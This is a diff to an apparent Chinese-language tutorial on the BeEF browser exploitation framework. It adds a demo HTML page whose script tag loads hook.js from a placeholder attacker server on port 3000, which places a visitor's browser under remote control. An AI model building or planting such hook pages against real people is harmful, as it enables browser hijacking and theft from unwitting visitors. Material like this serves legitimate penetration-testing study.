@@ -13,6 +13,21 @@ date: 2016-03-16 17:09
 
 只用将beef 提供的hook.js嵌入到自己构造的html页面就能作为可以hook的页面。
 
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <title>hook demo</title>
+<script src="http://xxx.xxx.xxx.xxx:3000/hook.js"></script>
+</head>
+<body>
+
+<p>This is a test</p>
+</body>
+</html>
+
+```
+
 * ./beef -h
 
 ```
